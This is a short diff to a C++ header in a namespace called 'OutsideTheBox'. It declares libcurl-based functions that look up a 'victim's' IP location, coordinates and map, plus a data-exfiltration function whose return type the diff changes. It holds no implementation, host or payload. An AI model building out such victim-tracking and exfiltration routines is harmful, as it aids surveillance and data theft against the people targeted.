@@ -24,7 +24,7 @@ namespace OutsideTheBox {
   std::string getVictimsIpLocationInfos(CURL *hnd, std::string IP);
   std::vector<std::string> getVictimsIpLatLon(std::string IPLocation);
   std::string getVictimsIpLocationMaps(std::string IPlat, std::string IPlong);
-  std::string dataExf(CURL* hnd, std::string data);
+  CURLcode dataExf(CURL *hnd, std::string data);
   void cleanup(CURL * hnd);
 }
 
